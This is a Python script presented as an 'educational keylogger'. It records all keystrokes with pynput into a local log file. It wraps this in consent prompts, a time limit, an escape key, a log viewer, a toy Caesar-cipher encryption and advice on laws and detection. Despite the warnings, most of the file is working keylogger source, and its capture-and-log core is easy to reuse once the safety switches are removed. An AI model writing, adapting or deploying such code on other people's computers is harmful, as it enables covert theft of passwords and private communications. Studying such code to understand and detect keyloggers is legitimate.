#!/usr/bin/env python3
"""
================================================================================
EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY
================================================================================

⚠️ ETHICAL WARNING:
This program is for EDUCATIONAL PURPOSES ONLY. 
Only use on computers you OWN or have EXPLICIT PERMISSION to test.

Using keyloggers without permission is:
- ILLEGAL in most jurisdictions
- UNETHICAL and violates privacy
- Can result in criminal charges
================================================================================
"""

import os
import sys
import time
import datetime
import threading
from pynput import keyboard

# ==============================================================================
# CONFIGURATION - MODIFY THESE SETTINGS
# ==============================================================================

# Safety settings
SAFETY_MODE = True  # Set to False only for authorized testing
REQUIRE_PASSWORD = False  # Requires password to start
ADMIN_PASSWORD = "EDUCATION123"  # Change this!

# Logging settings
LOG_FILE = "keylog_educational.txt"  # Output file
MAX_LOG_SIZE = 1024 * 1024  # 1MB max file size (prevents large logs)
LOG_DURATION = 300  # 5 minutes maximum (auto-stop for safety)

# Special keys mapping
SPECIAL_KEYS = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n[ENTER]\n',
    keyboard.Key.tab: '\t',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.delete: '[DEL]',
    keyboard.Key.esc: '[ESC]',
    keyboard.Key.shift: '[SHIFT]',
    keyboard.Key.ctrl_l: '[CTRL]',
    keyboard.Key.ctrl_r: '[CTRL]',
    keyboard.Key.alt_l: '[ALT]',
    keyboard.Key.alt_r: '[ALT]',
    keyboard.Key.cmd: '[WIN]',
    keyboard.Key.caps_lock: '[CAPSLOCK]',
    keyboard.Key.up: '[UP]',
    keyboard.Key.down: '[DOWN]',
    keyboard.Key.left: '[LEFT]',
    keyboard.Key.right: '[RIGHT]',
    keyboard.Key.page_up: '[PGUP]',
    keyboard.Key.page_down: '[PGDN]',
    keyboard.Key.home: '[HOME]',
    keyboard.Key.end: '[END]',
    keyboard.Key.insert: '[INS]',
    keyboard.Key.menu: '[MENU]',
    keyboard.Key.f1: '[F1]',
    keyboard.Key.f2: '[F2]',
    keyboard.Key.f3: '[F3]',
    keyboard.Key.f4: '[F4]',
    keyboard.Key.f5: '[F5]',
    keyboard.Key.f6: '[F6]',
    keyboard.Key.f7: '[F7]',
    keyboard.Key.f8: '[F8]',
    keyboard.Key.f9: '[F9]',
    keyboard.Key.f10: '[F10]',
    keyboard.Key.f11: '[F11]',
    keyboard.Key.f12: '[F12]',
}

# ==============================================================================
# SAFETY FUNCTIONS - PREVENT MISUSE
# ==============================================================================

def display_warning():
    """Display ethical warning and get consent."""
    warning = """
    ╔══════════════════════════════════════════════════════════╗
    ║                 ⚠️  ETHICAL WARNING  ⚠️                  ║
    ╠══════════════════════════════════════════════════════════╣
    ║  KEYLOGGER SOFTWARE - FOR EDUCATIONAL PURPOSES ONLY      ║
    ║                                                          ║
    ║  USING KEYLOGGERS WITHOUT PERMISSION IS:                 ║
    ║  • ILLEGAL in most countries                             ║
    ║  • A violation of privacy laws                           ║
    ║  • Unethical and potentially criminal                    ║
    ║                                                          ║
    ║  By continuing, you confirm:                             ║
    ║  1. You own this computer OR                             ║
    ║  2. You have EXPLICIT WRITTEN PERMISSION                ║
    ║  3. This is for EDUCATIONAL/LEARNING only               ║
    ║  4. You will NOT use this maliciously                   ║
    ╚══════════════════════════════════════════════════════════╝
    """
    
    print(warning)
    
    if SAFETY_MODE:
        response = input("\nDo you understand and accept these terms? (yes/no): ")
        if response.lower() != 'yes':
            print("\n❌ Program terminated. Good decision!")
            sys.exit(0)
        
        if REQUIRE_PASSWORD:
            password = input("\nEnter admin password to continue: ")
            if password != ADMIN_PASSWORD:
                print("\n❌ Incorrect password. Program terminated.")
                sys.exit(0)

def check_file_size():
    """Prevent log files from getting too large."""
    if os.path.exists(LOG_FILE):
        size = os.path.getsize(LOG_FILE)
        if size > MAX_LOG_SIZE:
            print(f"\n⚠️  Log file exceeds {MAX_LOG_SIZE//1024}KB limit")
            print("Creating backup and starting new log...")
            
            # Create backup with timestamp
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            backup_file = f"keylog_backup_{timestamp}.txt"
            os.rename(LOG_FILE, backup_file)
            print(f"Backup created: {backup_file}")
            
            return True
    return False

def get_user_info():
    """Get information about who is running this and why."""
    print("\n" + "="*60)
    print("USER INFORMATION (For educational record keeping)")
    print("="*60)
    
    name = input("Your name (for educational record): ")
    purpose = input("Purpose of this test (e.g., 'learning', 'project'): ")
    computer_owner = input("Do you own this computer? (yes/no): ")
    
    info = f"\n{'='*60}\n"
    info += f"KEYLOGGER SESSION - EDUCATIONAL USE ONLY\n"
    info += f"Date/Time: {datetime.datetime.now()}\n"
    info += f"User: {name}\n"
    info += f"Purpose: {purpose}\n"
    info += f"Computer Owner: {computer_owner}\n"
    info += f"{'='*60}\n\n"
    
    return info

# ==============================================================================
# KEYLOGGER CORE FUNCTIONS
# ==============================================================================

class EducationalKeylogger:
    """
    Educational keylogger class with safety features.
    
    Features:
    1. Captures keystrokes
    2. Logs to file with timestamps
    3. Auto-stops after time limit
    4. Includes safety warnings
    5. Prevents misuse
    """
    
    def __init__(self):
        self.log = ""
        self.start_time = time.time()
        self.is_running = False
        self.listener = None
        
    def on_press(self, key):
        """
        Called when a key is pressed.
        Converts key to string and logs it.
        """
        try:
            # Check for special keys
            if key in SPECIAL_KEYS:
                self.log += SPECIAL_KEYS[key]
            else:
                # Regular key - convert to string
                self.log += str(key).replace("'", "")
            
            # Auto-save every 10 characters (prevents data loss)
            if len(self.log) >= 10:
                self.save_to_file()
                
        except Exception as e:
            print(f"Error logging key: {e}")
            
        # Check if time limit reached
        if time.time() - self.start_time > LOG_DURATION:
            print(f"\n⏰ Time limit reached ({LOG_DURATION} seconds)")
            print("Auto-stopping for safety...")
            return False  # This stops the listener
            
        return True  # Continue listening
    
    def on_release(self, key):
        """
        Called when a key is released.
        We can use this for special controls.
        """
        # Stop if ESC is pressed (emergency stop)
        if key == keyboard.Key.esc:
            print("\n⏹️  ESC pressed - Stopping keylogger")
            return False
            
        return True
    
    def save_to_file(self):
        """Save current log to file."""
        try:
            # Create log entry with timestamp
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] {self.log}\n"
            
            # Append to file
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry)
            
            # Clear the buffer
            self.log = ""
            
        except Exception as e:
            print(f"Error saving to file: {e}")
    
    def start(self):
        """Start the keylogger."""
        print("\n" + "="*60)
        print("STARTING EDUCATIONAL KEYLOGGER")
        print("="*60)
        
        # Get user info and write to log
        user_info = get_user_info()
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(user_info)
        
        print(f"\n📝 Logging to: {LOG_FILE}")
        print(f"⏱️  Auto-stop after: {LOG_DURATION} seconds")
        print("⏹️  Press ESC to stop immediately")
        print("-"*60)
        print("✅ Keylogger is now running...")
        print("(All keystrokes will be logged with timestamps)")
        print("-"*60)
        
        self.is_running = True
        self.start_time = time.time()
        
        # Create and start the listener
        self.listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        )
        
        self.listener.start()
        
        # Keep the program running
        try:
            while self.is_running:
                time.sleep(0.1)
                
                # Check if listener is still alive
                if not self.listener.running:
                    self.is_running = False
                    
        except KeyboardInterrupt:
            print("\n\n🛑 Keyboard interrupt detected")
            self.stop()
    
    def stop(self):
        """Stop the keylogger gracefully."""
        print("\n🛑 Stopping keylogger...")
        
        if self.listener:
            self.listener.stop()
        
        # Save any remaining log data
        if self.log:
            self.save_to_file()
        
        self.is_running = False
        
        # Add session end marker
        end_marker = f"\n{'='*60}\nSESSION ENDED: {datetime.datetime.now()}\n{'='*60}\n"
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(end_marker)
        
        print(f"✅ Keylogger stopped. Log saved to: {LOG_FILE}")
        print("⚠️  Remember: This data is for EDUCATIONAL PURPOSES ONLY")
        print("   Delete the log file after your learning session.")

# ==============================================================================
# ADDITIONAL SAFETY FEATURES
# ==============================================================================

def view_log_ethically():
    """View the log file with privacy warnings."""
    if not os.path.exists(LOG_FILE):
        print("❌ No log file found.")
        return
    
    print("\n" + "="*60)
    print("VIEWING LOG FILE - EDUCATIONAL PURPOSES ONLY")
    print("="*60)
    
    warning = """
    ⚠️  PRIVACY WARNING:
    This log may contain sensitive information.
    Only view this for educational analysis.
    Delete the file after your learning session.
    """
    print(warning)
    
    response = input("\nDo you want to continue viewing? (yes/no): ")
    if response.lower() != 'yes':
        return
    
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Show only first 500 characters for privacy
        preview = content[:500]
        print("\n📄 LOG PREVIEW (first 500 characters):")
        print("-"*40)
        print(preview)
        
        if len(content) > 500:
            print(f"\n... (truncated, total {len(content)} characters)")
        
        # Offer to delete the file
        delete = input("\nDelete log file for privacy? (yes/no): ")
        if delete.lower() == 'yes':
            os.remove(LOG_FILE)
            print("✅ Log file deleted.")
            
    except Exception as e:
        print(f"❌ Error reading log: {e}")

def create_encrypted_log():
    """Create an encrypted version (basic demonstration)."""
    print("\n🔐 DEMONSTRATION: Basic Log Encryption")
    print("(This is a simple demonstration, not secure encryption)")
    
    if not os.path.exists(LOG_FILE):
        print("❌ No log file to encrypt.")
        return
    
    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Simple Caesar cipher encryption (for demonstration only)
        encrypted = ""
        for char in content:
            if char.isprintable():
                # Shift character by 3 positions
                encrypted += chr((ord(char) + 3) % 256)
            else:
                encrypted += char
        
        # Save encrypted version
        encrypted_file = "encrypted_log.txt"
        with open(encrypted_file, 'w', encoding='utf-8') as f:
            f.write(encrypted)
        
        print(f"✅ Encrypted log saved to: {encrypted_file}")
        print("⚠️  Note: This is basic demonstration encryption only.")
        print("   For real security, use proper encryption libraries.")
        
    except Exception as e:
        print(f"❌ Error encrypting log: {e}")

# ==============================================================================
# MAIN MENU AND PROGRAM FLOW
# ==============================================================================

def display_menu():
    """Display main menu."""
    menu = """
    ╔══════════════════════════════════════════════════════════╗
    ║        EDUCATIONAL KEYLOGGER - MAIN MENU                 ║
    ╠══════════════════════════════════════════════════════════╣
    ║  1. 📝 Start Keylogger (Educational Mode)                ║
    ║  2. 📄 View Log File (With Privacy Warnings)             ║
    ║  3. 🔐 Demonstrate Log Encryption                        ║
    ║  4. 🗑️  Delete All Log Files                             ║
    ║  5. 📚 View Educational Resources                        ║
    ║  6. 🚪 Exit Program                                      ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(menu)

def delete_logs():
    """Delete all log files with confirmation."""
    print("\n" + "="*60)
    print("DELETE LOG FILES")
    print("="*60)
    
    warning = """
    ⚠️  WARNING: This will permanently delete all log files.
    Only proceed if you're finished with your educational session.
    """
    print(warning)
    
    response = input("\nAre you sure you want to delete ALL log files? (yes/no): ")
    if response.lower() != 'yes':
        print("Deletion cancelled.")
        return
    
    deleted_files = []
    
    # Delete all keylog files
    for filename in os.listdir('.'):
        if filename.startswith('keylog') or filename.startswith('encrypted_log'):
            try:
                os.remove(filename)
                deleted_files.append(filename)
            except Exception as e:
                print(f"❌ Error deleting {filename}: {e}")
    
    if deleted_files:
        print(f"\n✅ Deleted {len(deleted_files)} file(s):")
        for f in deleted_files:
            print(f"   • {f}")
    else:
        print("✅ No log files found to delete.")

def educational_resources():
    """Display educational resources about keyloggers."""
    resources = """
    📚 EDUCATIONAL RESOURCES ABOUT KEYLOGGERS
    
    ============================================
    ⚖️ LEGAL AND ETHICAL CONSIDERATIONS:
    ============================================
    
    1. Laws Vary by Country:
       • USA: Computer Fraud and Abuse Act (CFAA)
       • UK: Computer Misuse Act 1990
       • EU: Various privacy laws (GDPR)
       • Many countries have similar laws
    
    2. Keylogger Laws Typically Cover:
       • Unauthorized access to computer systems
       • Interception of communications
       • Privacy violations
       • Data theft
    
    3. Legal Uses:
       • Parental controls (with minor children)
       • Corporate security (with employee consent)
       • Personal use on your own devices
       • Educational/research with ethics approval
    
    ============================================
    🔒 SECURITY BEST PRACTICES:
    ============================================
    
    1. How to Detect Keyloggers:
       • Monitor running processes
       • Check startup programs
       • Use antivirus/anti-malware software
       • Monitor network traffic
    
    2. Protection Methods:
       • Use virtual keyboards for sensitive input
       • Enable two-factor authentication
       • Regularly update antivirus software
       • Be cautious of unknown software
    
    3. If You Find a Keylogger:
       • Disconnect from internet
       • Run antivirus scan
       • Change all passwords (from a clean device)
       • Report to authorities if malicious
    
    ============================================
    🎓 LEARNING RESOURCES:
    ============================================
    
    Books:
    • "The Art of Memory Forensics"
    • "Practical Malware Analysis"
    
    Online Courses:
    • Cybrary: Ethical Hacking
    • Coursera: Computer Security
    • Udemy: Python for Security
    
    Websites:
    • OWASP (Open Web Application Security Project)
    • SANS Institute
    • MITRE ATT&CK Framework
    
    ============================================
    💡 REMEMBER:
    ============================================
    With great power comes great responsibility.
    Always use security knowledge ethically and legally.
    """
    print(resources)

def main():
    """Main program function."""
    
    # Display warning first
    display_warning()
    
    # Main program loop
    while True:
        display_menu()
        
        try:
            choice = input("\nEnter your choice (1-6): ").strip()
            
            if choice == "1":
                # Check file size before starting
                check_file_size()
                
                # Create and start keylogger
                keylogger = EducationalKeylogger()
                keylogger.start()
                
                # Ask if user wants to view log after stopping
                if os.path.exists(LOG_FILE):
                    view = input("\nView the log file? (yes/no): ")
                    if view.lower() == 'yes':
                        view_log_ethically()
            
            elif choice == "2":
                view_log_ethically()
            
            elif choice == "3":
                create_encrypted_log()
            
            elif choice == "4":
                delete_logs()
            
            elif choice == "5":
                educational_resources()
            
            elif choice == "6":
                print("\n" + "="*60)
                print("Thank you for using the Educational Keylogger responsibly!")
                print("Remember to use security knowledge ethically. 🔒")
                print("="*60)
                break
            
            else:
                print("❌ Invalid choice! Please enter 1-6.")
            
            # Pause before next menu
            if choice != "6":
                input("\nPress Enter to continue...")
                
        except KeyboardInterrupt:
            print("\n\n⚠️  Program interrupted. Exiting...")
            break
        except Exception as e:
            print(f"\n❌ An error occurred: {e}")
            input("\nPress Enter to continue...")

# ==============================================================================
# PROGRAM ENTRY POINT
# ==============================================================================

if __name__ == "__main__":
    print("\n" + "="*70)
    print("EDUCATIONAL KEYLOGGER - FOR LEARNING PURPOSES ONLY")
    print("="*70)
    
    # Check if pynput is installed
    try:
        from pynput import keyboard
    except ImportError:
        print("\n❌ Required library 'pynput' not found.")
        print("Install it with: pip install pynput")
        sys.exit(1)
    
    # Run main program
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Goodbye! Remember to use this knowledge ethically.")
    except Exception as e:
        print(f"\n❌ Critical error: {e}")
        print("Please check your Python installation and permissions.")
